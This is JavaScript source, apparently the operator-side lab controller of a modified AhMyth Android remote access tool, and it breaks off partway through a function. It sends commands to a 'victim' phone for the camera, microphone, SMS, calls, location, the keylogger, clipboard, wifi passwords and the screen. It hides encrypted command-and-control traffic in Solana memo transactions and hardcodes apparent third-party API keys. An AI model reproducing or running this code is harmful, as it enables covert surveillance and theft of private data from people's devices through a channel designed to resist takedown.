const remote = require('@electron/remote');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
var homedir = require('node-homedir');
var path = require("path");
let crypto, bs58, Connection, PublicKey;
let sendBlockchainCommandRaw = async () => {
    throw new Error('Blockchain operator module not available; configure NODE path and env before issuing blockchain lab commands');
};

try {
    crypto = require('crypto');
    bs58 = require('bs58');
    const solanaWeb3 = require('@solana/web3.js');
    Connection = solanaWeb3.Connection;
    PublicKey = solanaWeb3.PublicKey;
} catch (e) {
    console.error('Failed to load blockchain dependencies:', e);
}

try {
    let operator;
    if (remote && remote.require) {
        operator = remote.require('./blockchain-operator');
    } else {
        operator = require('../../../../blockchain-operator');
    }
    if (operator && operator.sendCommand) {
        sendBlockchainCommandRaw = operator.sendCommand.bind(operator);
    }
} catch (e) {
    console.warn('Blockchain operator not available:', e.message);
}

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory using remote
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            order: 'order',
            orders: {
                camera: 'x0000ca',
                fileManager: 'x0000fm',
                calls: 'x0000cl',
                sms: 'x0000sm',
                mic: 'x0000mc',
                location: 'x0000lm',
                contacts: 'x0000cn',
                deviceInfo: 'x0000di',
                apps: 'x0000ap',
                clipboard: 'x0000cb',
                wifi: 'x0000wf',
                screen: 'x0000sc'
            },
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}

var ORDER = CONSTANTS.order;
var originalSocket = remote.getCurrentWebContents().victim;

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
var logPath = path.join(dataPath, 'Logs');
var db;
try {
    // Try to load database module
    const dbPath = path.resolve(__dirname, '../Database.js');
    if (fs.existsSync(dbPath)) {
        db = require(dbPath);
        console.log('[AhMyth] Database module loaded');
    } else {
        // Database module is optional - suppress warning in production
        if (process.env.NODE_ENV === 'development') {
            console.warn('[AhMyth] Database module not found at:', dbPath);
        }
    }
} catch (e) {
    // Only log database errors in development
    if (process.env.NODE_ENV === 'development') {
        console.error('[AhMyth] Failed to load database:', e);
    }
}

// Ensure log directory exists
if (!fs.existsSync(logPath)) {
    fs.mkdirSync(logPath, { recursive: true });
}

// Debug log file
var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T')[0]}.log`);

// Store reference to Angular scope for UI logging (set later by controller)
var labScope = null;
var rootScope = null;
// Victim metadata (used to decide blockchain vs TCP)
const currentVictim = (remote && remote.getCurrentWebContents && remote.getCurrentWebContents().victim) || {};

function isBlockchainVictim(victim = currentVictim) {
    if (!victim) return false;
    // Safely convert to strings - handle cases where values might be objects or other types
    const connectionType = (typeof victim.connectionType === 'string' ? victim.connectionType : (victim.connectionType ? String(victim.connectionType) : '')).toLowerCase();
    const conn = (typeof victim.conn === 'string' ? victim.conn : (victim.conn ? String(victim.conn) : '')).toLowerCase();
    const ipLabel = (typeof victim.ip === 'string' ? victim.ip : (victim.ip ? String(victim.ip) : '')).toLowerCase().trim();
    return !!(
        victim.isBlockchain ||
        connectionType === 'blockchain' ||
        conn === 'blockchain' ||
        ipLabel === 'blockchain' ||
        ipLabel.startsWith('blockchain')
    );
}

// ---------------- Blockchain helpers -----------------
// Resolve project root (same logic as AppCtrl)
let projectRoot;
try {
    if (remote && remote.app) {
        const appPath = remote.app.getAppPath();
        projectRoot = path.resolve(appPath, '..', '..');
    } else {
        projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
    }
} catch (e) {
    // Fallback for dev/test environment
    projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
}

const blockchainKeysEnvPath = path.join(projectRoot, '.blockchain-keys.env');
const blockchainContractEnvPath = path.join(projectRoot, '.blockchain-contract.env');
const blockchainConfigPath = path.join(projectRoot, 'config', 'blockchain_c2.json');

function parseEnvFile(filePath) {
    if (!fs.existsSync(filePath)) {
        console.warn(`[LabCtrl] Env file not found: ${filePath}`);
        return {};
    }
    try {
        return fs.readFileSync(filePath, 'utf8')
            .split(/\r?\n/)
            .reduce((acc, line) => {
                const m = line.trim().match(/^([^=#]+)=(.*)$/);
                if (m) acc[m[1].trim()] = m[2].trim();
                return acc;
            }, {});
    } catch (e) {
        console.error(`[LabCtrl] Failed to parse env file ${filePath}:`, e.message);
        return {};
    }
}

// Load blockchain env with better error handling
const keysEnv = parseEnvFile(blockchainKeysEnvPath);
const contractEnv = parseEnvFile(blockchainContractEnvPath);

const blockchainEnv = {
    ...keysEnv,
    ...contractEnv,
    ...process.env
};

const rpcPenaltyBox = new Map();
const RPC_BACKOFF_BASE = 1500;
const RPC_BACKOFF_CAP = 60000;

function normalizeRpc(rpc) {
    return typeof rpc === 'string' ? rpc.trim() : '';
}

function penalizeRpcEndpoint(rpc, reason) {
    const normalized = normalizeRpc(rpc);
    if (!normalized) return;
    const current = rpcPenaltyBox.get(normalized);
    const severe = reason && /429|rate|forbid|403/i.test(String(reason));
    const bump = severe ? 5000 : 250;
    const nextDelay = Math.min(
        current ? Math.floor(current.delay * 1.8) + bump : (severe ? RPC_BACKOFF_BASE * 2 : RPC_BACKOFF_BASE),
        RPC_BACKOFF_CAP
    );
    rpcPenaltyBox.set(normalized, {
        delay: nextDelay,
        until: Date.now() + nextDelay,
        reason: reason || 'RPC error'
    });
    console.warn(`[LabCtrl] RPC ${normalized} throttled for ${nextDelay}ms (${reason || 'error'})`);
}

function clearRpcPenalty(rpc) {
    const normalized = normalizeRpc(rpc);
    if (!normalized) return;
    rpcPenaltyBox.delete(normalized);
}

function canUseRpcEndpoint(rpc) {
    const normalized = normalizeRpc(rpc);
    if (!normalized) return false;
    const entry = rpcPenaltyBox.get(normalized);
    if (!entry) return true;
    if (Date.now() >= entry.until) {
        rpcPenaltyBox.delete(normalized);
        return true;
    }
    return false;
}

function getRpcPenaltyDelay(rpc) {
    const normalized = normalizeRpc(rpc);
    const entry = rpcPenaltyBox.get(normalized);
    return entry ? entry.delay : RPC_BACKOFF_BASE;
}

function splitRpcList(value) {
    if (!value) return [];
    if (Array.isArray(value)) {
        return value.map((v) => String(v).trim()).filter(Boolean);
    }
    return String(value)
        .split(/[\s,;]+/)
        .map((part) => part.trim())
        .filter(Boolean);
}

const BLOCKCHAIN_COMMAND_TIMEOUTS = {
    [CONSTANTS.orders.camera]: 180000, // 3 minutes for camera (chunked images can take time)
    [CONSTANTS.orders.fileManager]: 120000,
    [CONSTANTS.orders.calls]: 90000,
    [CONSTANTS.orders.sms]: 90000,
    [CONSTANTS.orders.mic]: 90000,
    [CONSTANTS.orders.location]: 90000,
    [CONSTANTS.orders.contacts]: 90000,
    [CONSTANTS.orders.deviceInfo]: 120000, // Increased for chunked responses
    [CONSTANTS.orders.apps]: 90000,
    [CONSTANTS.orders.installApp]: 120000,
    [CONSTANTS.orders.uninstallApp]: 120000,
    [CONSTANTS.orders.clipboard]: 60000,
    [CONSTANTS.orders.wifi]: 120000, // Increased for chunked responses
    [CONSTANTS.orders.wifiPasswords]: 90000,
    [CONSTANTS.orders.screen]: 180000, // 3 minutes for screen (chunked images)
    [CONSTANTS.orders.makeCall]: 90000,
    [CONSTANTS.orders.liveMic]: 90000,
    [CONSTANTS.orders.input]: 90000,
    [CONSTANTS.orders.keylogger]: 90000,
    [CONSTANTS.orders.browserHistory]: 90000,
    [CONSTANTS.orders.notifications]: 60000,
    [CONSTANTS.orders.systemInfo]: 60000,
    [CONSTANTS.orders.foreground]: 60000
};

// Commands that don't send responses (fire-and-forget)
const FIRE_AND_FORGET_COMMANDS = new Set([
    CONSTANTS.orders.foreground, // x0000fg - foreground/background control
    'x0000wk' // wake screen (if it exists)
]);

const blockchainResponseTimers = new Map();
const blockchainResponseTimerMetadata = new Map(); // Store original timeout and description
const sendBlockchainAndPollTimers = new Map(); // Store timers from sendBlockchainAndPoll

function getCommandKey(event, data) {
    return data && data.order ? data.order : event;
}

function startBlockchainResponseTimer(key, description, duration) {
    clearBlockchainResponseTimer(key);
    const timeout = duration || BLOCKCHAIN_COMMAND_TIMEOUTS[key] || 90000;
    const timer = setTimeout(() => {
        blockchainResponseTimers.delete(key);
        blockchainResponseTimerMetadata.delete(key);
        const msg = description || key;
        console.warn(`[LabCtrl] Timeout waiting for ${msg} response`);
        if (rootScope && rootScope.Log) {
            rootScope.Log(`[⚠] Timeout waiting for ${msg} response. Check blockchain connection or permissions.`, CONSTANTS.logStatus.WARNING);
        }
    }, timeout);
    blockchainResponseTimers.set(key, timer);
    blockchainResponseTimerMetadata.set(key, {
        originalTimeout: timeout,
        description: description || key,
        startTime: Date.now()
    });
}

function clearBlockchainResponseTimer(key) {
    const timer = blockchainResponseTimers.get(key);
    if (timer) {
        clearTimeout(timer);
        blockchainResponseTimers.delete(key);
        blockchainResponseTimerMetadata.delete(key);
    }
}

function resetBlockchainResponseTimer(key) {
    const metadata = blockchainResponseTimerMetadata.get(key);
    if (metadata && blockchainResponseTimers.has(key)) {
        // Clear existing timer
        const oldTimer = blockchainResponseTimers.get(key);
        if (oldTimer) {
            clearTimeout(oldTimer);
        }
        // Restart with FULL original timeout (not remaining time)
        // This ensures we always get the full duration when chunks arrive
        const timer = setTimeout(() => {
            blockchainResponseTimers.delete(key);
            blockchainResponseTimerMetadata.delete(key);
            const msg = metadata.description || key;
            console.warn(`[LabCtrl] Timeout waiting for ${msg} response`);
            if (rootScope && rootScope.Log) {
                rootScope.Log(`[⚠] Timeout waiting for ${msg} response. Check blockchain connection or permissions.`, CONSTANTS.logStatus.WARNING);
            }
        }, metadata.originalTimeout);
        blockchainResponseTimers.set(key, timer);
        // Update start time to now so we track from when chunk arrived
        metadata.startTime = Date.now();
        console.log(`[LabCtrl] Reset timeout for ${key} (${metadata.originalTimeout}ms from now, chunked response in progress)`);
    }
}

function resetAllBlockchainResponseTimers() {
    // Reset all active timers when chunks are received (we don't know which command the chunk is for)
    const keys = Array.from(blockchainResponseTimers.keys());
    keys.forEach(key => {
        resetBlockchainResponseTimer(key);
    });
    if (keys.length > 0) {
        console.log(`[LabCtrl] Reset ${keys.length} active timer(s) due to chunked response`);
    }
}

// Log what was loaded for debugging
console.log('[LabCtrl] Blockchain env paths:', {
    keysPath: blockchainKeysEnvPath,
    contractPath: blockchainContractEnvPath,
    keysFound: Object.keys(keysEnv).length > 0,
    contractFound: Object.keys(contractEnv).length > 0,
    contractAddress: blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS || 'NOT SET'
});

const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');

function getSolanaRpcCandidatesLab() {
    const defaultAlchemyKey = blockchainEnv.SOLANA_ALCHEMY_KEY || blockchainEnv.ALCHEMY_API_KEY || blockchainEnv.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
    const heliusKey = blockchainEnv.SOLANA_HELIUS_KEY || blockchainEnv.HELIUS_API_KEY;
    const configuredList = [
        ...splitRpcList(blockchainEnv.SOLANA_RPC_LIST),
        ...splitRpcList(blockchainEnv.SOLANA_RPC_FALLBACKS),
        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_FALLBACKS),
        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_URLS),
        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_LIST),
        blockchainEnv.SOLANA_RPC_URL,
        blockchainEnv.BLOCKCHAIN_RPC_URL,
        blockchainEnv.BLOCKCHAIN_SECONDARY_RPC,
        blockchainEnv.BLOCKCHAIN_TERTIARY_RPC,
        blockchainEnv.SOLANA_SECONDARY_RPC,
        blockchainEnv.SOLANA_TERTIARY_RPC,
        blockchainEnv.SOLANA_RPC_CONFIG_FALLBACKS,
        blockchainEnv.SOLANA_PUBLIC_RPCS,
        blockchainEnv.BLOCKCHAIN_PUBLIC_RPCS
    ];

    const heuristics = [
        heliusKey ? `https://rpc.helius.xyz/?api-key=${heliusKey}&network=devnet` : null,
        `https://solana-devnet.g.alchemy.com/v2/${defaultAlchemyKey}`,
        `https://solana-mainnet.g.alchemy.com/v2/${defaultAlchemyKey}`,
        blockchainEnv.SOLANA_HELIUS_RPC,
        blockchainEnv.SOLANA_QUICKNODE_RPC,
        blockchainEnv.BLOCKCHAIN_QUICKNODE_RPC,
        'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa', // Helius API key (max 10 req/s)
        'https://solana-devnet.g.alchemy.com/v2/demo',
        'https://api.devnet.solana.com',
        'https://rpc.ankr.com/solana'
    ];

    const combined = [...configuredList, ...heuristics].filter(Boolean);
    const seen = new Set();
    const deduped = [];
    combined.forEach((rpc) => {
        const normalized = (rpc || '').trim();
        if (!normalized) return;
        const key = normalized.toLowerCase();
        if (seen.has(key)) return;
        seen.add(key);
        deduped.push(normalized);
    });

    if (!deduped.length) {
        deduped.push('https://api.devnet.solana.com');
    }
    return deduped;
}

function normalizeAesKey(keyHex) {
    if (!keyHex) return null;
    return keyHex.startsWith('0x') ? keyHex.substring(2) : keyHex;
}

function decryptMemoPayload(hexPayload) {
    try {
        const clean = hexPayload.startsWith('0x') ? hexPayload.substring(2) : hexPayload;
        const bytes = Buffer.from(clean, 'hex');
        if (bytes.length < 12 + 16) return null;
        const nonce = bytes.slice(0, 12);
        const ciphertext = bytes.slice(12, -16);
        const tag = bytes.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(normalizeAesKey(blockchainEnv.BLOCKCHAIN_C2_AES_KEY), 'hex'), nonce);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        return decrypted.toString('utf8');
    } catch (e) {
        console.error('Failed to decrypt memo payload', e.message);
        return null;
    }
}

function extractMemosFromTransaction(tx) {
    if (!tx || !tx.transaction || !tx.transaction.message) return [];
    const message = tx.transaction.message;
    const accountKeys = (message.accountKeys || []).map((k) => (k.pubkey ? k.pubkey.toString() : k.toString()));
    const memos = [];
    const instructions = message.instructions || [];
    for (const instr of instructions) {
        if (instr.parsed && instr.parsed.type === 'memo' && instr.parsed.info && instr.parsed.info.memo) {
            memos.push(instr.parsed.info.memo);
            continue;
        }
        const programId = instr.programId || null;
        let programMatches = false;
        if (programId && programId.toString && programId.toString() === MEMO_PROGRAM_ID.toString()) {
            programMatches = true;
        } else if (instr.programIdIndex != null && instr.programIdIndex < accountKeys.length) {
            programMatches = accountKeys[instr.programIdIndex] === MEMO_PROGRAM_ID.toString();
        }
        if (programMatches) {
            const parsedMemo = typeof instr.parsed === 'string' ? instr.parsed : instr.parsed?.info?.memo;
            const data = instr.data || parsedMemo;
            if (typeof data === 'string') {
                if (data.startsWith('RESP:') || data.startsWith('RESPCH:') || data.startsWith('CMD:')) {
                    memos.push(data);
                } else {
                    try {
                        memos.push(Buffer.from(bs58.decode(data)).toString('utf8'));
                    } catch (e) {
                        // ignore
                    }
                }
            }
        }
    }
    return memos;
}

async function pollForResponseMemoLab(expectedEvent, timeoutMs = 90000) {
    reloadBlockchainEnv();
    
    const contractAddress = blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS;
    if (!contractAddress) {
        throw new Error('Missing blockchain contract/channel address for polling');
    }
    
    const rpcList = getSolanaRpcCandidatesLab();
    if (!rpcList.length) {
        throw new Error('No RPC endpoints configured for blockchain polling');
    }
    const channelPubkey = new PublicKey(contractAddress);
    const seen = new Set();
    const start = Date.now();
    let rpcIndex = 0;
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    const chunkBuffers = new Map();

    async function rpcCall(rpc, method, params) {
        const controller = new AbortController();
        const t = setTimeout(() => controller.abort(), 6000);
        try {
            const res = await fetch(rpc, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
                signal: controller.signal
            });
            if (!res.ok) {
                const error = new Error(`HTTP ${res.status}`);
                error.httpStatus = res.status;
                throw error;
            }
            const json = await res.json();
            if (json.error) {
                const err = new Error(json.error.message || 'RPC error');
                err.httpStatus = json.error.code;
                throw err;
            }
            return json.result;
        } catch (err) {
            if (err.name === 'AbortError') {
                err.message = 'RPC timeout';
                err.httpStatus = err.httpStatus || 'timeout';
            }
            throw err;
        } finally {
            clearTimeout(t);
        }
    }

    while (Date.now() - start < timeoutMs) {
        const rpc = rpcList[rpcIndex % rpcList.length];
        rpcIndex++;

        if (!canUseRpcEndpoint(rpc)) {
            await wait(250);
            continue;
        }

        let rpcHadFailure = false;
        try {
            const sigInfos = await rpcCall(rpc, 'getSignaturesForAddress', [
                channelPubkey.toBase58(),
                { limit: 25, commitment: 'confirmed' }
            ]);
            if (Array.isArray(sigInfos)) {
                for (const info of sigInfos) {
                    if (!info || !info.signature) continue;
                    if (seen.has(info.signature)) continue;
                    seen.add(info.signature);
                    try {
                        const tx = await rpcCall(rpc, 'getTransaction', [
                            info.signature,
                            { encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 0 }
                        ]);
                        const memos = extractMemosFromTransaction(tx);
                        for (const memo of memos) {
                            if (!memo) continue;
                            if (memo.startsWith('RESPCH:')) {
                                const m = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
                                if (!m) continue;
                                const chunkId = m[1];
                                const part = parseInt(m[2], 10);
                                const total = parseInt(m[3], 10);
                                const chunkHex = m[4];
                                if (part <= 0 || part > total) continue;
                                let entry = chunkBuffers.get(chunkId);
                                if (!entry) entry = { total, parts: new Array(total).fill(null), received: 0 };
                                if (!entry.parts[part - 1]) {
                                    entry.parts[part - 1] = chunkHex;
                                    entry.received += 1;
                                }
                                chunkBuffers.set(chunkId, entry);
                                if (entry.received === entry.total) {
                                    const assembled = entry.parts.join('');
                                    chunkBuffers.delete(chunkId);
                                    const decrypted = decryptMemoPayload(assembled);
                                    try {
                                        const parsed = JSON.parse(decrypted || '{}');
                                        if (!expectedEvent || parsed.event === expectedEvent) {
                                            return parsed;
                                        }
                                    } catch {}
                                }
                                continue;
                            }
                            if (memo.startsWith('RESP:')) {
                                const decrypted = decryptMemoPayload(memo.substring(5));
                                try {
                                    const parsed = JSON.parse(decrypted || '{}');
                                    if (!expectedEvent || parsed.event === expectedEvent) {
                                        return parsed;
                                    }
                                } catch {}
                            }
                        }
                    } catch (inner) {
                        rpcHadFailure = true;
                        const reason = inner && inner.httpStatus === 429 ? 'rate limited' : (inner.message || 'RPC error');
                        penalizeRpcEndpoint(rpc, reason);
                        break;
                    }
                }
            }
            if (!rpcHadFailure) {
                clearRpcPenalty(rpc);
            }
        } catch (err) {
            const reason = err && err.httpStatus === 429 ? 'rate limited' : (err.message || 'RPC error');
            penalizeRpcEndpoint(rpc, reason);
            await wait(Math.min(getRpcPenaltyDelay(rpc), 2000));
            continue;
        }

        if (rpcHadFailure) {
            await wait(Math.min(getRpcPenaltyDelay(rpc), 2000));
            continue;
        }
        await wait(Math.min(1500 + rpcPenaltyBox.size * 200, 2500));
    }
    throw new Error(`No blockchain response for ${expectedEvent || 'command'} within timeout`);
}

// Reload blockchain env (call this if config changes)
function reloadBlockchainEnv() {
    const keysEnv = parseEnvFile(blockchainKeysEnvPath);
    const contractEnv = parseEnvFile(blockchainContractEnvPath);
    
    // Update blockchainEnv object
    Object.keys(blockchainEnv).forEach(key => {
        if (!process.env[key]) delete blockchainEnv[key];
    });
    Object.assign(blockchainEnv, keysEnv, contractEnv, process.env);
    if (fs.existsSync(blockchainConfigPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(blockchainConfigPath, 'utf8'));
            if (config.rpc_url) blockchainEnv.BLOCKCHAIN_RPC_URL = config.rpc_url;
            if (config.rpc_url && !blockchainEnv.SOLANA_RPC_URL) blockchainEnv.SOLANA_RPC_URL = config.rpc_url;
            if (config.contract_address) blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS = config.contract_address;
            if (config.contract_address && !blockchainEnv.SOLANA_CHANNEL_ADDRESS) blockchainEnv.SOLANA_CHANNEL_ADDRESS = config.contract_address;
            if (config.aes_key_env) {
                const aesKey = process.env[config.aes_key_env];
                if (aesKey) blockchainEnv.BLOCKCHAIN_C2_AES_KEY = aesKey;
            }
            if (config.rpc_fallbacks) {
                const fallbackList = Array.isArray(config.rpc_fallbacks)
                    ? config.rpc_fallbacks.join(',')
                    : String(config.rpc_fallbacks);
                blockchainEnv.SOLANA_RPC_CONFIG_FALLBACKS = fallbackList;
            }
        } catch (e) {
            console.warn('[LabCtrl] Failed to load blockchain config:', e.message);
        }
    }
    
    console.log('[LabCtrl] Reloaded blockchain env:', {
        contractAddress: blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS || 'NOT SET',
        hasRpc: !!(blockchainEnv.SOLANA_RPC_URL || blockchainEnv.BLOCKCHAIN_RPC_URL),
        hasAesKey: !!blockchainEnv.BLOCKCHAIN_C2_AES_KEY,
        hasOperatorKey: !!(blockchainEnv.BLOCKCHAIN_PRIVATE_KEY || blockchainEnv.SOLANA_OPERATOR_PRIVATE_KEY)
    });
}

async function sendBlockchainAndPoll(eventName, payload, isFireAndForget = false) {
    // Reload env before each command to ensure we have latest config
    reloadBlockchainEnv();
    
    const rpcCandidates = getSolanaRpcCandidatesLab();
    const rpc = rpcCandidates[0] || blockchainEnv.SOLANA_RPC_URL || blockchainEnv.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com';
    const contractAddress = blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS;
    
    if (!contractAddress) {
        const errorMsg = `Missing blockchain contract/channel address. Checked paths:\n  - ${blockchainKeysEnvPath}\n  - ${blockchainContractEnvPath}\n\nPlease ensure BLOCKCHAIN_CONTRACT_ADDRESS or SOLANA_CHANNEL_ADDRESS is set in one of these files.`;
        console.error('[LabCtrl]', errorMsg);
        throw new Error(errorMsg);
    }
    
    if (!blockchainEnv.BLOCKCHAIN_PRIVATE_KEY && !blockchainEnv.SOLANA_OPERATOR_PRIVATE_KEY) {
        throw new Error('Missing operator private key (BLOCKCHAIN_PRIVATE_KEY or SOLANA_OPERATOR_PRIVATE_KEY)');
    }
    
    console.log('[LabCtrl] Sending blockchain command:', {
        event: eventName,
        contract: contractAddress.substring(0, 8) + '...',
        rpc: rpc.substring(0, 30) + '...',
        fireAndForget: isFireAndForget
    });
    
    const txInfo = await sendBlockchainCommandRaw(eventName, payload || {});
    const rpcUsed = txInfo && txInfo.rpc ? txInfo.rpc : rpc;
    const txSig = txInfo && txInfo.txSig ? txInfo.txSig : 'n/a';
    logToFile('REQUEST', `blockchain:${eventName}`, { rpc: rpcUsed, tx: txSig });

    // For fire-and-forget commands, don't wait for response
    if (isFireAndForget) {
        if (rootScope && rootScope.Log) {
            rootScope.Log(`[✓] Command sent successfully (no response expected)`, CONSTANTS.logStatus.SUCCESS);
        }
        return { sent: true, tx: txSig, rpc: rpcUsed, fireAndForget: true };
    }

    // Wait for response via socket (which is fed by main.js throttled polling)
    // instead of aggressive polling here
    return new Promise((resolve, reject) => {
        const timeoutMs = BLOCKCHAIN_COMMAND_TIMEOUTS[eventName] || 90000;
        const state = { resolved: false }; // Use object to allow closure access
        let timer = null;
        
        const createTimer = () => {
            if (timer) {
                clearTimeout(timer);
                sendBlockchainAndPollTimers.delete(eventName);
            }
            timer = setTimeout(() => {
                if (!state.resolved) {
                    state.resolved = true;
                    sendBlockchainAndPollTimers.delete(eventName);
                    socket.removeAllListeners(eventName); // Clean up
                    console.warn(`[LabCtrl] Timeout waiting for ${eventName} response after ${timeoutMs}ms`);
                    // Don't reject, just return pending so UI doesn't crash
                    resolve({ pending: true, tx: txSig, rpc: rpcUsed, timeout: true });
                }
            }, timeoutMs);
            // Store timer reference so it can be reset when chunks arrive
            sendBlockchainAndPollTimers.set(eventName, { 
                timer, 
                timeoutMs, 
                createTimer, 
                resolved: () => state.resolved,
                state: state // Store state object for direct access
            });
        };
        
        // Create initial timer
        createTimer();

        socket.once(eventName, (data) => {
            if (!state.resolved) {
                state.resolved = true;
                if (timer) {
                    clearTimeout(timer);
                    sendBlockchainAndPollTimers.delete(eventName);
                }
                logToFile('RESPONSE', `blockchain:${eventName}`, data);
                console.log(`[LabCtrl] Received ${eventName} response`);
                resolve(data);
            }
        });
    });
}


// Set the scope reference from controller
function setLabScope(scope, root) {
    labScope = scope;
    rootScope = root;
}

// Log to file function AND to UI Activity Log
function logToFile(type, command, data) {
    const timestamp = new Date().toISOString();
    const dataStr = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data || '');
    const truncatedData = dataStr.length > 5000 ? dataStr.substring(0, 5000) + '\n...[truncated]' : dataStr;
    const logEntry = `\n[${timestamp}] [${type}] ${command}\n${'='.repeat(60)}\n${truncatedData}\n`;
    
    try {
        fs.appendFileSync(debugLogFile, logEntry);
    } catch (e) {
        console.error('Error writing to debug log:', e);
    }
    
    // Log to console
    console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
    
    // Log to SQLite DB
    if (db) {
        try {
            db.log(type, command, dataStr.includes('"error"') ? 'FAIL' : 'SUCCESS');
        } catch (e) {
            console.error('DB Log Error:', e);
        }
    }
    
    // Log to UI Activity Log panel
    if (rootScope && rootScope.Log) {
        const shortData = dataStr.length > 100 ? dataStr.substring(0, 100) + '...' : dataStr;
        if (type === 'REQUEST') {
            rootScope.Log(`[→ REQ] ${command}: ${shortData}`, CONSTANTS.logStatus.INFO);
        } else if (type === 'RESPONSE') {
            // Check if response indicates success or error
            if (dataStr.includes('"error"') || dataStr.includes('"success":false')) {
                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.FAIL);
            } else {
                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.SUCCESS);
            }
        }
        // Trigger Angular digest if needed
        try {
            if (rootScope && !rootScope.$$phase) {
                rootScope.$apply();
            }
        } catch (e) {}
    }
    // Mirror into blockchain logs tab for unified visibility
    try {
        if (window.$appCtrl && typeof window.$appCtrl.appendBlockchainLog === 'function') {
            window.$appCtrl.appendBlockchainLog(`[${type}] ${command}: ${dataStr.substring(0, 200)}`);
        }
    } catch (_) {}
}

// Track registered listeners to avoid double-registration
var registeredListeners = {};
const listenerCallbacks = new Map();

function dispatchListener(event, data) {
    const callbacks = listenerCallbacks.get(event);
    if (callbacks && callbacks.length) {
        callbacks.forEach(cb => {
            try {
                cb(data);
            } catch (e) {
                console.error(`[LabCtrl] Listener error for ${event}:`, e);
            }
        });
    }
}

// Wrap socket with logging - improved version that tracks listeners
var socket = {
    emit: function(event, data) {
        const useBlockchain = currentVictim && ((currentVictim.connectionType === 'blockchain') || currentVictim.isBlockchain || currentVictim.conn === 'blockchain' || !currentVictim.ip);
        logToFile('REQUEST', event, data);
        if (labScope) labScope.packetCount++;
        if (useBlockchain || !originalSocket || !originalSocket.connected) {
            const action = data && data.order ? data.order : event;
            const payload = data || {};
            const description = payload.extra ? `${action} (${payload.extra})` : action;
            
            // Don't start timer for fire-and-forget commands
            const isFireAndForget = FIRE_AND_FORGET_COMMANDS.has(action);
            if (!isFireAndForget) {
                startBlockchainResponseTimer(action, description);
            }
            
            return sendBlockchainAndPoll(action, payload, isFireAndForget)
                .then((result) => {
                    // Clear timer only if we got a response (not timeout)
                    if (result && !result.timeout && !result.pending) {
                        clearBlockchainResponseTimer(action);
                    }
                    return result;
                })
                .catch((e) => {
                    console.error('Blockchain send failed', e);
                    clearBlockchainResponseTimer(action);
                    if (rootScope && rootScope.Log) {
                        rootScope.Log(`[✗] Blockchain send failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
                    }
                    throw e;
                });
        }
        return originalSocket.emit(event, data);
    },
    on: function(event, callback) {
        // Track registration to prevent duplicate listeners
        if (registeredListeners[event]) {
            console.log(`[AhMyth] Listener already registered for ${event}, replacing...`);
            originalSocket.removeAllListeners(event);
        }
        registeredListeners[event] = true;
        
        return originalSocket.on(event, function(data) {
            logToFile('RESPONSE', event, data);
            if (labScope) labScope.packetCount++;
            clearBlockchainResponseTimer(event);
            try {
                // Clone data to prevent mutations between listeners
                const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
                callback(clonedData);
            } catch (e) {
                console.error(`[AhMyth] Error in callback for ${event}:`, e);
                if (rootScope && rootScope.Log) {
                    rootScope.Log(`[✗] Error processing ${event}: ${e.message}`, CONSTANTS.logStatus.FAIL);
                }
            }
        });
    },
    once: function(event, callback) {
        // Use Socket.IO's native once method directly to avoid removing other listeners
        // We still wrap it to add logging
        const wrappedCallback = function(data) {
            logToFile('RESPONSE', event, data);
